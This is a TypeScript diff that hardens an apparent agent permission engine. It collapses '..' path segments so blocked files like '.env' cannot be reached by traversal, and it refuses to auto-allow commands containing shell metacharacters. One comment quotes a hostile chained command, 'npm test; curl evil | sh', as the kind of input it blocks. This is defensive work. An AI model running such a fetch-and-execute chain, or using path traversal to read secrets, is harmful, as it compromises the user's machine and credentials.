@@ -1,3 +1,4 @@
+import { posix as posixPath } from 'node:path';
 import { minimatch } from 'minimatch';
 import {
   DEFAULT_ALLOWED_COMMANDS,
@@ -53,18 +54,33 @@ function deny(reason: string): PermissionDecision {
   return { allowed: false, requiresConfirmation: false, reason };
 }
 
-/** Normalizes a repository-relative path for matching (posix separators, no leading `./`). */
+/**
+ * Normalizes a repository-relative path for matching (posix separators, no
+ * leading `./`). CRITICALLY it COLLAPSES `..`/`.` segments first, so a blocked
+ * pattern like `.env` still matches an evasion such as `src/../.env` — the
+ * string handed to minimatch is the canonical path fs will actually open.
+ */
 function normalizeRelPath(relPath: string): string {
-  let normalized = relPath.replace(/\\/g, '/').trim();
-  while (normalized.startsWith('./')) {
-    normalized = normalized.slice(2);
+  const slashed = relPath.replace(/\\/g, '/').trim();
+  // Guard the empty path: posix.normalize('') returns '.', which would slip
+  // past the caller's empty-path denial — keep empty input empty.
+  if (slashed.length === 0) {
+    return '';
   }
-  return normalized.replace(/^\/+/, '');
+  // posix.normalize collapses `a/../b` → `b`, `./x` → `x`, `a//b` → `a/b`.
+  const collapsed = posixPath.normalize(slashed);
+  return collapsed.replace(/^(\.\/)+/, '').replace(/^\/+/, '');
 }
 
 /** Collapses whitespace so `npm  test` matches the `npm test` allowlist entry. */
 function normalizeCommand(command: string): string {
   return command.trim().replace(/\s+/g, ' ');
+}
+
+/** Shell control/metacharacters that enable chaining, pipes, subshells, redirection. */
+const SHELL_METACHAR_RE = /[;&|`$<>\n()]/;
+export function hasShellMetacharacters(command: string): boolean {
+  return SHELL_METACHAR_RE.test(command);
 }
 
 export class PermissionEngine {
@@ -93,6 +109,13 @@ export class PermissionEngine {
   }
 
   private commandIsAllowlisted(command: string): boolean {
+    // A command carrying shell control/metacharacters (chaining, pipes, command
+    // substitution, redirection) is NEVER auto-allowed: an allowlist glob like
+    // `npm test*` must not green-light `npm test; curl evil | sh`. Such commands
+    // fall through to confirmation regardless of the run_command flag.
+    if (hasShellMetacharacters(command)) {
+      return false;
+    }
     return this.allowedCommands.some(
       (entry) =>
         normalizeCommand(entry) === command || minimatch(command, entry, { dot: true }),
